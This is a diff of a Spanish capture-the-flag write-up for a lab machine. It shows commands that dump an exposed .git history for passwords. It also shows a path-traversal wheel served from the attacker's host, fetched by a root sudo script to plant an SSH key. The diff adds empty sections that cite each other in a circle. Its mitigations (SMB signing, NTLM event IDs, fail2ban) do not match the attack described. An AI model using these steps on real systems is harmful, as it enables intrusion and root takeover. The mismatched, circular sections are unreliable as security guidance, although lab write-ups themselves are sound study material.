@@ -36,7 +36,11 @@ git.variatype.htb   -> repositorio expuesto
 dev.variatype.htb   -> portal de subida (interno)
 ```
 
-## Foothold: .git y credenciales
+## Enumeración
+
+- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+
+## Foothold
 
 ```bash
 wget -r http://git.variatype.htb/.git/
@@ -45,6 +49,43 @@ git log -p | grep -iE "password|api_key|token"
 ```
 
 Aparece una contraseña en un commit revertido que da acceso al portal de fuentes (`dev.variatype.htb`).
+
+## Movimiento lateral
+
+- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
+- El detalle está en «Escalada de privilegios».
+
+## Escalada de privilegios
+
+- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».
+
+## Evidencia
+
+```text
+/home/steve/user.txt  -> <user_flag>
+/root/root.txt        -> <root_flag>
+```
+
+## Lecciones aprendidas
+
+- Un `.git` expuesto sigue siendo oro: el historial conserva secretos que nadie borró del árbol.
+- La inyección por CDATA/XML en herramientas de fuentes (fontTools, FontForge) es la nueva frontera de SSTI.
+- `setuptools` confió históricamente en nombres remotos; cualquier script que descargue paquetes es un sink de traversal.
+- Mitigación: `.git` fuera del webroot, versiones parcheadas de fontTools/FontForge/setuptools y `sudo` sin comodines en los argumentos.
+
+## Mitigaciones y detección
+
+- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
+- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.
+- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
+- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.
+
+## Referencias
+
+- [CVE-2024-25082](https://nvd.nist.gov/vuln/detail/CVE-2024-25082)
+- [CVE-2025-47273](https://nvd.nist.gov/vuln/detail/CVE-2025-47273)
+- [CVE-2025-66034](https://nvd.nist.gov/vuln/detail/CVE-2025-66034)
+- [ssti](../../../knowledge/web/ssti.md)
 
 ## 2. CVE-2025-66034: escritura de fichero con fontTools
 
@@ -94,17 +135,3 @@ python3 -m http.server 8000     # sirviendo ../../../root/.ssh/authorized_keys
 sudo /usr/bin/python3 /opt/plugin_loader.py http://<IP>:8000/wheel
 ssh -i id_ed25519 root@<IP>
 ```
-
-## Evidencia (redactada)
-
-```text
-/home/steve/user.txt  -> <user_flag>
-/root/root.txt        -> <root_flag>
-```
-
-## Lecciones
-
-- Un `.git` expuesto sigue siendo oro: el historial conserva secretos que nadie borró del árbol.
-- La inyección por CDATA/XML en herramientas de fuentes (fontTools, FontForge) es la nueva frontera de SSTI.
-- `setuptools` confió históricamente en nombres remotos; cualquier script que descargue paquetes es un sink de traversal.
-- Mitigación: `.git` fuera del webroot, versiones parcheadas de fontTools/FontForge/setuptools y `sudo` sin comodines en los argumentos.
